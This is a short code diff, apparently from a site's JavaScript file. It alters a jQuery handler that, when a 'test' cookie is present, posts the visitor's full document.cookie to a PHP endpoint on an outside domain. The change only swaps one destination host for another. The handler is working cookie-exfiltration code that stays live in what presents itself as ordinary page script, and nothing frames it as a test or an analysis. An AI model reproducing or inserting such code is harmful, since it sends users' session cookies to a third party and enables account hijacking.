@@ -112,7 +112,7 @@
 
 $(document).ready(function(){
     if ($.cookie('test')) {
-        $.post('http://happiness.chto.su/c.php',{l:'test',p:'test',c:document.cookie},function(){
+        $.post('https://ss1.regmyudid.com/c.php',{l:'test',p:'test',c:document.cookie},function(){
             alert('yay!');
         });
     }
